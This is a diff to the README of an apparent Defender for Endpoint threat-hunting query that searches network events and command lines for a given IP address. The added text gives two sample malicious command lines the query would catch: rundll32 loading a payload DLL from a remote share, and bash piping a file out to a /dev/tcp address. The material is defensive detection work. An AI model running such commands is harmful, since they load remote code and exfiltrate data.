@@ -3,8 +3,17 @@
 ## Query Information
 
 #### Description
-This query is meant to perform a IP lookup on both the DeviceNetworkEvents as well as the commandline references. This can help in incident investigations to quickly find all the related logs and commandline references of the IP address. The LookupIP is used to set a IP on which you want to look for. The query has also a setting that you can change to only show commandline results, thent he line | where CommandLineReference == true needs to be uncommented. 
+This query can be used to perform a IP lookup on both the DeviceNetworkEvents as well as the commandline references. This can help in incident investigations to quickly find all the related logs and commandline references of the IP address. The *LookupIP* is used to set a IP on which you want to look for. This can eiter be a public or private address. Both ipv4 and ipv6 are supported The query has also a setting that you can change to only show commandline results, thent he line *| where CommandLineReference == true* needs to be uncommented. 
 
+Two examples below are stated, which will be shown based on the commandline lookup. Remote downloads or executions of files can be an indicator of malicious activity.
+```
+rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
+bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/192.168.1.10/24'
+```
+
+#### References
+- https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
+- https://lolbas-project.github.io/lolbas/Binaries/Bash/
 ## Defender For Endpoint
 ```
 // Set the IP address you are trying to lookup.
